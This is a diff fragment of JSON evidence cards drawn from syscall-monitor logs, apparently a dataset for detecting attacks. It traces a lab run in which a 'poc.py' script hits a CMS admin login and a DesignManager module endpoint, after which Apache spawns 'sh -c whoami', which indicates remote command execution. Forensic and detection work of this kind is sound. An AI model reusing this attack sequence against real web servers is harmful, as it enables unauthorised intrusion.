+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0062",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"b0e44c0a70c6\", \"evt.arg.data\": \"POST /admin/login.php HTTP/1.1..Host: 192.168.123.3..User-Agent: python-requests\", \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": null, \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:39:54.605649968\", \"evt.is_io_read\": null, \"evt.is_io_write\": true, \"evt.num\": 7698614, \"evt.rawres\": 230, \"evt.time\": \"03:39:54.605649968\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.cport\": 56146, \"fd.directory\": null, \"fd.ino\": 0, \"fd.is_server\": null, \"fd.lip\": \"63.87.132.252\", \"fd.name\": \"192.168.123.2:56146->63.87.132.252:80\", \"fd.num\": 3, \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\", \"proc.pid\": 370254, \"proc.vpid\": 3 ...[truncated]",
+      "line": 951775,
+      "timestamp": "2025-01-11 03:39:54.605649968",
+      "extracted_clues": {
+        "paths": [
+          "/1.1..Host",
+          "/admin/login.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1..Host:",
+          "/admin/login.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "User",
+          "admin"
+        ],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0063",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"b0e44c0a70c6\", \"evt.arg.data\": \"username=test0&password=test0&passwordagain=test0&changepwhash=5669c92cef962d28e\", \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": null, \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:39:54.605666404\", \"evt.is_io_read\": null, \"evt.is_io_write\": true, \"evt.num\": 7698616, \"evt.rawres\": 135, \"evt.time\": \"03:39:54.605666404\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.cport\": 56146, \"fd.directory\": null, \"fd.ino\": 0, \"fd.is_server\": null, \"fd.lip\": \"63.87.132.252\", \"fd.name\": \"192.168.123.2:56146->63.87.132.252:80\", \"fd.num\": 3, \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\", \"proc.pid\": 370254, \"proc.vpid\": 3 ...[truncated]",
+      "line": 951776,
+      "timestamp": "2025-01-11 03:39:54.605666404",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0064",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"b0e44c0a70c6\", \"evt.arg.data\": \"POST /admin/login.php HTTP/1.1..Host: 192.168.123.3..User-Agent: python-requests\", \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": null, \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:39:55.233953829\", \"evt.is_io_read\": null, \"evt.is_io_write\": true, \"evt.num\": 7711846, \"evt.rawres\": 293, \"evt.time\": \"03:39:55.233953829\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.cport\": 56156, \"fd.directory\": null, \"fd.ino\": 0, \"fd.is_server\": null, \"fd.lip\": \"63.87.132.252\", \"fd.name\": \"192.168.123.2:56156->63.87.132.252:80\", \"fd.num\": 4, \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\", \"proc.pid\": 370254, \"proc.vpid\": 3 ...[truncated]",
+      "line": 951810,
+      "timestamp": "2025-01-11 03:39:55.233953829",
+      "extracted_clues": {
+        "paths": [
+          "/1.1..Host",
+          "/admin/login.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1..Host:",
+          "/admin/login.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "User",
+          "admin"
+        ],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0065",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"b0e44c0a70c6\", \"evt.arg.data\": \"username=test0&password=test0&loginsubmit=Submit\", \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": null, \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:39:55.233970735\", \"evt.is_io_read\": null, \"evt.is_io_write\": true, \"evt.num\": 7711848, \"evt.rawres\": 48, \"evt.time\": \"03:39:55.233970735\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.cport\": 56156, \"fd.directory\": null, \"fd.ino\": 0, \"fd.is_server\": null, \"fd.lip\": \"63.87.132.252\", \"fd.name\": \"192.168.123.2:56156->63.87.132.252:80\", \"fd.num\": 4, \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\", \"proc.pid\": 370254, \"proc.vpid\": 32, \"thread.tid\": 370254, \"thread.vtid\": 32}",
+      "line": 951811,
+      "timestamp": "2025-01-11 03:39:55.233970735",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0066",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:40:10.676908229\", \"evt.rawres\": -2, \"evt.time\": \"03:40:10.676908229\", \"evt.type\": \"newfstatat\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 951903,
+      "timestamp": "2025-01-11 03:40:10.676908229",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "newfstatat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0067",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:40:22.029259636\", \"evt.rawres\": 0, \"evt.time\": \"03:40:22.029259636\", \"evt.type\": \"ioctl\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:53184->192.168.123.3:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 951947,
+      "timestamp": "2025-01-11 03:40:22.029259636",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "ioctl"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0068",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:40:49.237322341\", \"evt.rawres\": -2, \"evt.time\": \"03:40:49.237322341\", \"evt.type\": \"newfstatat\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952054,
+      "timestamp": "2025-01-11 03:40:49.237322341",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "newfstatat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0069",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"HTTP/1.1 200 OK..Date: Fri, 10 Jan 2025 19:40:50 GMT..Server: Apache/2.4.38 (Deb\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:40:50.334819236\", \"evt.rawres\": 4325, \"evt.time\": \"03:40:50.334819236\", \"evt.type\": \"recvfrom\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:53184->192.168.123.3:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952064,
+      "timestamp": "2025-01-11 03:40:50.334819236",
+      "extracted_clues": {
+        "paths": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1",
+          "/2.4.38",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "recvfrom"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0070",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"GET /admin/moduleinterface.php?mact=DesignManager%2Cm1_%2Cadmin_clearlocks%2C0&_\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:41:10.642407859\", \"evt.rawres\": 620, \"evt.time\": \"03:41:10.642407859\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:37222->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952161,
+      "timestamp": "2025-01-11 03:41:10.642407859",
+      "extracted_clues": {
+        "paths": [
+          "/admin/moduleinterface.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/admin/moduleinterface.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "admin"
+        ],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0071",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.917260374\", \"evt.rawres\": -2, \"evt.time\": \"03:41:11.917260374\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630516,
+      "timestamp": "2025-01-11 03:41:11.917260374",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0072",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.927115300\", \"evt.rawres\": -2, \"evt.time\": \"03:41:11.927115300\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630617,
+      "timestamp": "2025-01-11 03:41:11.927115300",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0073",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.927179149\", \"evt.rawres\": 0, \"evt.time\": \"03:41:11.927179149\", \"evt.type\": \"fstat\", \"fd.name\": \"/var/www/html/lib/smarty/sysplugins/smarty_internal_parsetree_template.php\", \"fd.type\": \"file\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630626,
+      "timestamp": "2025-01-11 03:41:11.927179149",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2",
+          "/var/www/html/lib/smarty/sysplugins/smarty_internal_parsetree_template.php"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2",
+          "/var/www/html/lib/smarty/sysplugins/smarty_internal_parsetree_template.php"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "fstat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0074",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.928925675\", \"evt.rawres\": 0, \"evt.time\": \"03:41:11.928925675\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630706,
+      "timestamp": "2025-01-11 03:41:11.928925675",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0075",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.930224136\", \"evt.rawres\": 0, \"evt.time\": \"03:41:11.930224136\", \"evt.type\": \"fstat\", \"fd.name\": \"/var/www/html/lib/smarty/sysplugins/smarty_internal_compile_private_function_plugin.php\", \"fd.type\": \"file\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630780,
+      "timestamp": "2025-01-11 03:41:11.930224136",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2",
+          "/var/www/html/lib/smarty/sysplugins/smarty_internal_compile_private_function_plugin.php"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2",
+          "/var/www/html/lib/smarty/sysplugins/smarty_internal_compile_private_function_plugin.php"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "fstat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0076",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.930809583\", \"evt.rawres\": -2, \"evt.time\": \"03:41:11.930809583\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630807,
+      "timestamp": "2025-01-11 03:41:11.930809583",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0077",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.932094639\", \"evt.rawres\": -2, \"evt.time\": \"03:41:11.932094639\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630883,
+      "timestamp": "2025-01-11 03:41:11.932094639",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0078",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.932314667\", \"evt.rawres\": -2, \"evt.time\": \"03:41:11.932314667\", \"evt.type\": \"stat\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630895,
+      "timestamp": "2025-01-11 03:41:11.932314667",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "stat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0079",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:11.933380110\", \"evt.rawres\": -2, \"evt.time\": \"03:41:11.933380110\", \"evt.type\": \"access\", \"proc.cmdline\": \"apache2 -DFOREGROUND\", \"proc.exepath\": \"/usr/sbin/apache2\", \"proc.name\": \"apache2\"}",
+      "line": 2630928,
+      "timestamp": "2025-01-11 03:41:11.933380110",
+      "extracted_clues": {
+        "paths": [
+          "/usr/sbin/apache2"
+        ],
+        "endpoints": [
+          "/usr/sbin/apache2"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [],
+        "accounts": [],
+        "syscalls": [
+          "access"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0080",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"container.id\": \"2f4a26c64fd2\", \"evt.arg.data\": null, \"evt.arg.filename\": null, \"evt.arg.newpath\": null, \"evt.arg.oldpath\": null, \"evt.arg.pid\": \"sh\", \"evt.category\": \"process\", \"evt.datetime\": \"2025-01-11 03:41:11.940064078\", \"evt.is_io_read\": null, \"evt.is_io_write\": null, \"evt.num\": 8150303, \"evt.rawres\": 0, \"evt.time\": \"03:41:11.940064078\", \"evt.type\": \"execve\", \"fd.cip\": null, \"fd.cport\": null, \"fd.directory\": null, \"fd.ino\": null, \"fd.is_server\": null, \"fd.lip\": null, \"fd.name\": null, \"fd.num\": null, \"fd.rip\": null, \"fd.sip\": null, \"fd.sport\": null, \"fd.type\": null, \"proc.cmdline\": \"sh -c whoami\", \"proc.exepath\": \"/bin/dash\", \"proc.name\": \"sh\", \"proc.pid\": 370604, \"proc.vpid\": 661, \"thread.tid\": 370604, \"thread.vtid\": 661}",
+      "line": 2631079,
+      "timestamp": "2025-01-11 03:41:11.940064078",
+      "extracted_clues": {
+        "paths": [
+          "/bin/dash"
+        ],
+        "endpoints": [
+          "/bin/dash"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [],
+        "processes": [
+          "sh"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "execve"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0081",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:41:12.803460753\", \"evt.rawres\": 0, \"evt.time\": \"03:41:12.803460753\", \"evt.type\": \"ioctl\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:37222->63.87.132.252:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python poc.py 192.168.123.3 / ggg\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952226,
+      "timestamp": "2025-01-11 03:41:12.803460753",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3",
+          "63.87.132.252"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "poc.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "ioctl"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0082",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:41:20.806544597\", \"evt.rawres\": 0, \"evt.time\": \"03:41:20.806544597\", \"evt.type\": \"ioctl\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:53184->192.168.123.3:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952264,
+      "timestamp": "2025-01-11 03:41:20.806544597",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "ioctl"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0083",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"file\", \"evt.datetime\": \"2025-01-11 03:41:32.428148029\", \"evt.rawres\": -2, \"evt.time\": \"03:41:32.428148029\", \"evt.type\": \"newfstatat\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952320,
+      "timestamp": "2025-01-11 03:41:32.428148029",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [],
+        "ports": [],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "newfstatat"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0084",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"GET / HTTP/1.1..Host: 192.168.123.3..user-agent: Mozilla/5.0 (Macintosh; Intel M\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:41:36.745784651\", \"evt.rawres\": 306, \"evt.time\": \"03:41:36.745784651\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:53184->192.168.123.3:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952347,
+      "timestamp": "2025-01-11 03:41:36.745784651",
+      "extracted_clues": {
+        "paths": [
+          "/1.1..Host",
+          "/5.0",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1..Host:",
+          "/5.0",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "user"
+        ],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0085",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.arg.data\": \"GET /index.php?page=where-do-i-get-help HTTP/1.1..Host: 192.168.123.3..user-agen\", \"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:41:55.610206328\", \"evt.rawres\": 340, \"evt.time\": \"03:41:55.610206328\", \"evt.type\": \"sendto\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:53184->192.168.123.3:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952419,
+      "timestamp": "2025-01-11 03:41:55.610206328",
+      "extracted_clues": {
+        "paths": [
+          "/1.1..Host",
+          "/index.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/1.1..Host:",
+          "/index.php",
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [
+          "user"
+        ],
+        "syscalls": [
+          "sendto"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0086",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
+      "content": "{\"evt.category\": \"net\", \"evt.datetime\": \"2025-01-11 03:42:16.855987020\", \"evt.rawres\": 0, \"evt.time\": \"03:42:16.855987020\", \"evt.type\": \"ioctl\", \"fd.cip\": \"192.168.123.2\", \"fd.name\": \"192.168.123.2:53184->192.168.123.3:80\", \"fd.rip\": \"192.168.123.2\", \"fd.sip\": \"192.168.123.3\", \"fd.sport\": 80, \"fd.type\": \"ipv4\", \"proc.cmdline\": \"python gen.py\", \"proc.exepath\": \"/usr/local/bin/python3.12\", \"proc.name\": \"python\"}",
+      "line": 952508,
+      "timestamp": "2025-01-11 03:42:16.855987020",
+      "extracted_clues": {
+        "paths": [
+          "/usr/local/bin/python3.12"
+        ],
+        "endpoints": [
+          "/usr/local/bin/python3.12"
+        ],
+        "ips": [
+          "192.168.123.2",
+          "192.168.123.3"
+        ],
+        "ports": [
+          "80"
+        ],
+        "files": [
+          "gen.py"
+        ],
+        "processes": [
+          "python"
+        ],
+        "accounts": [],
+        "syscalls": [
+          "ioctl"
+        ]
+      }
+    },
+    {
+      "evidence_id": "E0087",
+      "card_type": "log_observation",
+      "source_type": "log_observation",
